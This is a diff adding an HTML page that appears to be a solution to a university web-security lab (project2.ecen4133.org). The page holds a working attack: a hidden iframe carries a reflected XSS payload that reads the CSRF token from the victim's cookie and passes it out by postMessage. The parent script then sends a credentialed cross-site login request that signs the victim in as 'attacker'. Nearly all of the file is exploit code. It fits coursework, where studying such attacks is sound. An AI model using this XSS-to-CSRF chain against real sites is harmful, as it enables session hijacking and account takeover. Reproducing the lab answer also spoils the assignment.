@@ -1,0 +1,19 @@
+<html>
+<body>
+    <iframe src="https://project2.ecen4133.org/search?q=%3Cscript%3Ewindow.parent.postMessage%28document.cookie.split%28%22+%22%29%5B0%5D.slice%2811%2C+-1%29%2C+%22*%22%29%3C%2Fscript%3E" id="myFrame" height="0" width="0"></iframe>
+
+
+    <script>
+        const Http =  new XMLHttpRequest();
+        const url="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0";
+
+        window.addEventListener("message", (event) => {
+            Http.open("POST", url, true);
+            Http.withCredentials=true;
+            Http.send("csrf_token=" + event.data + "&username=attacker&password=l33th4x");
+            }, false);
+
+        
+    </script>
+</body>
+</html>
